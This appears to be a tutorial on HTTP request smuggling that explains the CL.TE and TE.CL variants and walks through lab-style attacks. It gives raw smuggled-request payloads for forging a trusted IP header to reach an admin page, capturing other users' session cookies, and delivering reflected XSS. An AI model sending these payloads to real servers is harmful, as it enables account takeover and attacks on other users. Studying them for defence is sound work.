# HTTP request smuggling

**Category: HTTP Request Smuggling (Request Desynchronization)**
**Severity: High or Critical**
---
To ensure precise classification during reporting and threat modeling, map this weakness against the following industry frameworks:

* **CWE-444 (Primary)**: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') — The frontend proxy and backend server interpret the boundaries of an HTTP request differently, allowing an attacker to desynchronize request processing.

* **CWE-436 (Related)**: Interpretation Conflict — A broader weakness describing inconsistent interpretation of the same input by different components, of which HTTP Request Smuggling is a specialized example.

* **OWASP Top 10 Reference**: A05:2021 – Security Misconfiguration — Commonly associated with inconsistent or insecure proxy/backend configurations that enable request smuggling. Depending on the root cause and impact, it may also relate to A04:2021 – Insecure Design.

## Defination:
***HTTP Request Smuggling*** is an exploitation technique that targets websites where a front-end server (like a load balancer or proxy) forwards requests to a back-end web server over a shared connection.
The vulnerability occurs when the front-end and back-end servers interpret the boundaries of an HTTP request differently, usually due to a disagreement between the Content-Length and Transfer-Encoding headers.


## Root Cause

HTTP Request Smuggling occurs due to inconsistent HTTP request parsing between intermediary components (such as frontend proxies, load balancers, or CDNs) and backend servers. When these components interpret request boundaries differently—typically because of conflicting `Content-Length` and `Transfer-Encoding` headers or protocol parsing inconsistencies—an attacker can desynchronize the request stream and cause unintended requests to be processed by the backend.

# Classification of HTTP Request Smuggling Vulnerabilities

HTTP Request Smuggling variations are classified based on how the front-end proxy and back-end application server handle conflicting message-length headers (`Content-Length` vs. `Transfer-Encoding`), or how modern protocols interact with legacy back-ends.

---

### 1. CL.TE (Content-Length / Transfer-Encoding)
* **The Architecture:** The Front-End proxy relies on the `Content-Length` header, while the Back-End application server prioritizes the `Transfer-Encoding: chunked` header.
* **The Mechanism:** The attacker crafts a request where the outer `Content-Length` encapsulates the entire payload, forcing the front-end to forward it completely. However, the back-end processes the data as chunked and terminates reading early upon hitting the internal `0` chunk terminator. The remaining data is left trapped in the network connection buffer.
* **Core Core Layout Structure:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [Calculated Byte Count][total byte Count]
Transfer-Encoding: chunked

0

GET /target-endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
*   **The Front-End View (Content-Length):** The front-end ignores the headers and counts everything *after* the first blank line (the line after `Transfer-Encoding: chunked`). It counts the `0`, the line breaks, and the entire smuggled `GET` request all the way down to the `=` sign. In this exact example, that equals **139 bytes**.
*   **The Back-End View (Transfer-Encoding):** The back-end reads `0\r\n\r\n`. Mathematically, this sequence means "Zero bytes left in this chunked message, and this is the final empty line." The back-end completely ignores the remaining bytes (`GET /target-endpoint...`) during this transaction.

*   We explicitly tell the back-end that our smuggled request has a body size of **10 bytes**.
*   However, we only provide 2 bytes of data (`x=`). 
*   **The Poisoning Effect:** The back-end processes our smuggled request but freezes because it is missing 8 bytes of data. It holds the connection open. 
*   When an innocent user sends a normal request (e.g., `GET /index.html HTTP/1.1`), the server automatically glues that user's incoming text directly onto our `x=`, like this: `x=GET /index.html HTTP/1.1`.
*   Our parameter safely absorbs their request, preventing their data from breaking our smuggled HTTP syntax.

### 2. TE.CL (Transfer-Encoding / Content-Length)
* **The Architecture:** The Front-End proxy utilizes the `Transfer-Encoding: chunked` header, while the Back-End application server prioritizes the `Content-Length` header.
* **The Mechanism:** The front-end processes the request body using chunked lengths and forwards everything down to the terminal `0` chunk. However, the back-end ignores the chunks and looks only at the small `Content-Length` counter. It terminates reading early after processing the first chunk size indicator line, leaving the entire smuggled request trapped inside the network connection buffer.
* **Core Layout Structure:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /target-endpoint HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```
* **The Front-End View (Transfer-Encoding):** The front-end parses the payload as standard chunked data. It reads the hex value `5c` (92 in decimal) and swallows the subsequent 92 bytes of the smuggled request. It then encounters the `0` followed by trailing blank lines at the absolute bottom, determines the message is fully complete, and forwards the whole transmission downstream.
* **The Back-End View (Content-Length):** The back-end completely ignores the chunked settings and reads strictly based on `Content-Length: 4`. It counts exactly 4 bytes from the start of the body: the `5`, the `c`, and the hidden carriage return and line feed (`\r\n`). It treats this tiny line as the entire request body, handles the transaction, and ignores the rest of the stream.
* We explicitly set the `Content-Length` header inside our smuggled request to **10 bytes**.
* However, we only provide 2 bytes of actual parameter data (`x=`) before the terminal `0` chunk.
* **The Poisoning Effect:** The back-end handles the main connection cutoff, but when it eventually attempts to process the leftover, smuggled `GET /target-endpoint` request, it halts because it expects 8 more bytes of body data to satisfy that internal counter of 10.
* When an innocent user makes a standard connection (e.g., `GET /index.html HTTP/1.1`), the back-end automatically splices their incoming request headers directly onto our trailing `x=`, creating a combined parameter value like `x=GET /index.html HTTP/1.1`.
* Our parameter securely captures their incoming request string, preventing their protocol syntax from breaking our smuggled HTTP request structure and forcing the server to return the target page.

### a. Exploiting HTTP Request Smuggling to Reveal Front-End Request Rewriting

* **The Objective:** Exploit a **CL.TE** request smuggling vulnerability to discover the custom IP header added by the front-end proxy, forge it with the value `127.0.0.1`, bypass IP-based access control, and delete the user **carlos**.

* **The Mechanism:** A CL.TE payload is used to desynchronize the front-end and back-end request parsing. The attacker first smuggles a reflected request to reveal the rewritten HTTP request generated by the front-end, exposing the custom IP header (for example, `X-abcdef-IP`). A second smuggled request then includes this header with the trusted value `127.0.0.1`, allowing the back-end to treat the request as originating from localhost.

* **Core Layout Structure (Header Discovery):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [Calculated Byte Count]
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Length: 200
Connection: close

search=test
```

* **Core Layout Structure (Authorization Bypass):**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [Calculated Byte Count]
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-abcdef-IP: 127.0.0.1
Content-Length: 10
Connection: close

x=1
```

* **The Security Impact:** This attack demonstrates that request smuggling can expose hidden proxy-injected headers. If the application trusts these headers for authentication or authorization, an attacker can forge them to bypass access controls and perform privileged administrative actions.

### b. Exploiting HTTP Request Smuggling to Capture Other Users' Requests

* **The Objective:** Exploit a **CL.TE** request smuggling vulnerability to capture another user's HTTP request, extract their session cookie, and hijack their authenticated session.

* **The Mechanism:** The attacker smuggles a `POST /post/comment` request with an intentionally oversized `Content-Length`. The back-end waits for the remaining body bytes, causing the next user's request to be appended to the attacker's request body. Because the application stores the submitted comment, the victim's HTTP request—including sensitive headers such as `Cookie`—is stored and later displayed to the attacker.

* **Core Layout Structure:**

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [Calculated Byte Count]
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=<attacker-session>

csrf=<csrf-token>&postId=5&name=Attacker&email=attacker@example.com&website=&comment=test
```

* **The Request Capture:** Since the smuggled request declares a larger `Content-Length` than the supplied body, the back-end continues waiting for additional bytes. When the next user's request arrives on the reused connection, it becomes part of the unfinished comment body and is stored by the application.

* **The Session Hijacking:** The attacker retrieves the stored comment, extracts the victim's `Cookie` header from the captured request, and reuses the session cookie to access the victim's account without knowing their credentials.

* **The Security Impact:** This attack demonstrates that HTTP Request Smuggling can capture requests belonging to other users, leading to session hijacking, credential exposure, and unauthorized account access.

### c. Exploiting HTTP Request Smuggling to Deliver Reflected XSS

* **The Objective:** Exploit a **CL.TE** request smuggling vulnerability to deliver a reflected XSS payload to another user's browser by poisoning the back-end request queue.

* **The Mechanism:** The attacker first identifies that the application reflects the `User-Agent` header inside a hidden HTML input without proper sanitization. A smuggled `GET` request containing a malicious `User-Agent` header is then queued on the back-end connection. When the next user's request is processed, the poisoned request is served first, causing the victim to receive a response containing the reflected XSS payload.

* **Core Layout Structure:**

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [Calculated Byte Count]
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

* **The Request Poisoning:** The front-end forwards the entire payload based on `Content-Length`, while the back-end stops at the `0` chunk and queues the smuggled `GET` request. The next user's request triggers the processing of the queued request, causing the victim to receive the attacker-controlled response.

* **The XSS Delivery:** Since the application reflects the `User-Agent` header without proper output encoding, the injected payload (`a"/><script>alert(1)</script>`) executes in the victim's browser, resulting in a reflected Cross-Site Scripting (XSS) attack.

* **The Security Impact:** This attack demonstrates that HTTP Request Smuggling can be combined with reflected XSS to deliver client-side payloads to other users, enabling session theft, phishing, malicious JavaScript execution, and account compromise.
